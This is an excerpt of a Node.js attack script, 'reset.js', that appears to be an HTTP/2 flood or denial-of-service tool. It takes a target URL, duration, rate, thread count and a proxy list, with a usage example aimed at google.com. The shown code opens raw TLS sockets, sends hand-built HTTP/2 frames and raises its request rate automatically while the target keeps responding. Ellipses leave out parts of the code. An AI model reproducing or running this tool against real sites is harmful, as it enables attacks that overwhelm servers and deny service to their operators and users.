...
const detectRatelimit = process.argv[8] === 'on';

if (!target || !time || !ratelimit || !threads || !proxyfile || !ipversion || !['on', 'off'].includes(process.argv[8])) {
    console.clear();
    console.error(`Usage: node reset.js <target> <time> <rate> <thread> <proxyFile> <ipv4/ipv6> <on/off>`);
    console.error(`Example: node reset.js https://www.google.com 60 64 5 proxy.txt ipv4 on\n`);
    process.exit(1);
}
...
function detectRatelimitAutomatically() {
    const rateCheckInterval = 1000;
    const maxRatelimit = 1000;
    const minRatelimit = 10;
    let currentRatelimit = ratelimit;
    let successCount = 0;
    let errorCount = 0;

    function checkRateLimit() {
        let checkSocket = net.connect({
            port: 443,
            host: url.host,
        }, () => {
            setsockopt(checkSocket, 6, 3, 1)
            setsockopt(checkSocket, 6, TCP_NODELAY, 1)
            setsockopt(checkSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
            setsockopt(checkSocket, SOL_SOCKET, SO_RCVBUF, 1000000)

            let checkTLS = tls.connect({
                socket: checkSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                ...
                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    new HPACK().encode(headers)
                ]);

                checkTLS.write(Buffer.concat([encodeFrame(1, 1, packed, 0x1 | 0x4 | 0x20)]));

                checkTLS.on('data', (eventData) => {
                    successCount++;
                    checkTLS.destroy();
                    checkSocket.destroy();
                });
    ...
    setInterval(() => {
        ...
        if (successCount > errorCount) {
            currentRatelimit = Math.min(maxRatelimit, currentRatelimit + 10);
        } else {
            currentRatelimit = Math.max(minRatelimit, currentRatelimit - 10);
        }
        console.log(`Current Ratelimit: ${currentRatelimit}`);
        successCount = 0;
        errorCount = 0;
    }, rateCheckInterval);
}
